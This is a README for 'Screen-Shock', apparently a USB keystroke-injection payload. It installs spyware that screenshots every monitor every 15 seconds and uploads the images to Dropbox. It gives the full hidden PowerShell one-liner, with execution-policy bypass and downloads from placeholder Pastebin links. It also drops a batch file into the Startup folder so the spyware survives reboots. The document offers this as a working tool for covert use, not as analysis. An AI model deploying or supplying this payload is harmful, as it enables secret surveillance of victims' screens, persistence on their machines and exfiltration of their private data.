# Screen-Shock

This payload is meant to exfiltrate screenshots of all monitors and sends to a dropbox every 15 seconds. (This setting can be changed in the c.ps1 file)

## Description

This payload uses iwr to download 2 files
* I.bat
* c.ps1

**I.bat** is downloaded to the startup folder to maintain persistance and execute c.ps1 on reboot/startup

**c.ps1** will sit in AppData\Roaming folder, taking a screenshot of all monitors every 15 seconds

Then the contents will then be sent to the DropBox for viewing pleasure



## Getting Started

### Dependencies

* Pastebin or other file sharing service, Dropbox
* Windows 10
* [Here](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/DropBox-Upload.md) is a tutorial on how to use DropBox-Upload


### Executing program

* Plug in your device
* Device will download both files and place them in proper directories to then run the script

powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""


## Contributing

All contributors names will be listed here:

[atomiczsec](https://github.com/atomiczsec)

## Version History

* 0.1
    * Initial Release
